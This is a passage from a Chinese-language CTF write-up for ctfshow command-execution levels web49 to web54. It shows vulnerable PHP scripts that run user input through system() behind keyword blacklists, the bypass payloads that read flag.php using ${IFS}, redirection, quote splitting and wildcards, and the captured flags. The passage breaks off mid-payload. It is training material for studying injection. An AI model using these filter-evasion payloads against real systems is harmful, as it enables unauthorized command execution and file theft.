id=\"web49\"><a class=\"anchor\" href=\"#web49\">#</a> web49</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-05 22:22:43</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><pre><code>新过滤了百分号，继续绕过即可\n\npayload\n?c=tac%09fl''ag.php||\n?c=tac&lt;fl''ag.php||\n?c=nl&lt;fl''ag.php||\n?c=nl&lt;fl''ag.php%0a\n</code></pre>\n<pre><code>ctfshow&#123;1a7f4a4b-a785-4223-b474-fa7387ca1bef&#125;\n</code></pre>\n<h2 id=\"web50\"><a class=\"anchor\" href=\"#web50\">#</a> web50</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-05 22:32:47</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>新过滤\\x26、\\x09，<span class=\"token operator\">%</span><span class=\"token number\">09</span>被过滤掉了就用重定向符绕过即可</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>注：<span class=\"token operator\">&lt;</span><span class=\"token operator\">></span>和<span class=\"token operator\">?</span>同时使用不回显 所以用\\代替？</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>payload</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>tac<span class=\"token operator\">&lt;</span>fl<span class=\"token string single-quoted-string\">''</span>ag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>nl<span class=\"token operator\">&lt;</span>fl<span class=\"token string single-quoted-string\">''</span>ag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>tac<span class=\"token operator\">&lt;</span><span class=\"token operator\">></span>fl\\ag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;26b2154e-9d20-4af9-88b9-3c6cfe06e229&#125;\n</code></pre>\n<h2 id=\"web51\"><a class=\"anchor\" href=\"#web51\">#</a> web51</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-05 22:42:52</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>新过滤掉了tac，nl绕过即可</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>nl<span class=\"token operator\">&lt;</span>fl\\ag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>nl<span class=\"token operator\">&lt;</span>fl<span class=\"token string single-quoted-string\">''</span>ag<span class=\"token operator\">.</span><span class=\"token class-name\">php</span><span class=\"token operator\">||</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;429fb4d3-1c93-4a1d-9c19-6c85db70409a&#125;\n</code></pre>\n<h2 id=\"web52\"><a class=\"anchor\" href=\"#web52\">#</a> web52</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-05 22:50:30</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\" >/dev/null 2>&amp;1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>新过滤了<span class=\"token operator\">&lt;</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload1：</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token class-name type-declaration\">ls</span><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">/</span><span class=\"token operator\">||</span>\t检查根目录发现有flag文件</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token class-name type-declaration\">nl</span><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">/</span>fl<span class=\"token string single-quoted-string\">''</span><span class=\"token class-name\">ag</span><span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token class-name\">payload2</span>：</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token class-name type-declaration\">nl</span><span class=\"token variable\">$IFS</span><span class=\"token operator\">/</span>fl<span class=\"token string single-quoted-string\">''</span><span class=\"token class-name\">ag</span><span class=\"token operator\">||</span></pre></td></tr></table></figure><pre><code>ctfshow&#123;70c7c4b8-9cf2-4c77-8028-5633a799061c&#125;\n</code></pre>\n<h2 id=\"web53\"><a class=\"anchor\" href=\"#web53\">#</a> web53</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 18:21:02</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$d</span> <span class=\"token operator\">=</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$d</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'no'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>新添加回显打印</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload：</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token class-name type-declaration\">nl</span><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">&#125;</span>fl<span class=\"token string single-quoted-string\">''</span>ag<span class=\"token operator\">.</span>php</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span>ca<span class=\"token string single-quoted-string\">''</span><span class=\"token class-name type-declaration\">t</span><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">&#125;</span>fl<span class=\"token string single-quoted-string\">''</span>ag<span class=\"token operator\">.</span>php</pre></td></tr></table></figure><pre><code>ctfshow&#123;9a8e38e5-fbb1-4060-8025-6457dcb87d6e&#125;\n</code></pre>\n<h2 id=\"web54\"><a class=\"anchor\" href=\"#web54\">#</a> web54</h2>\n<p>命令执行，需要严格的过滤</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-07 19:43:42</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\>|\\&lt;/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>换花样过滤，全员添加<span class=\"token operator\">*</span>号，新过滤了nl、scp、rm</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload1：</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token class-name type-declaration\">uniq</span><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">??</span><span class=\"token operator\">??</span><span class=\"token operator\">.</span><span class=\"token operator\">??</span><span class=\"token operator\">?</span>\t<span class=\"token comment\">// 用来去除文本文件中连续的重复行</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token class-name type-declaration\">grep</span><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">&#125;</span><span class=\"token string single-quoted-string\">'&#123;'</span><span class=\"token variable\">$</span><span class=\"token punctuation\">&#123;</span><span class=\"token constant\">IFS</span><span class=\"token punctuation\">&#125;</span>fl<span class=\"token operator\">??</span><span class=\"token operator\">.</span>php\t<span class=\"token comment\">// 在 fl??.php 匹配到的文件中，查找含有 &#123;的文件，并打印出包含 &#123;的这一行</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>c<span class=\"token operator\">=</span><span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span><span class=\"token operator\">?</span><span class=\"token class-name type-declaration\">at</span><span class=\"token 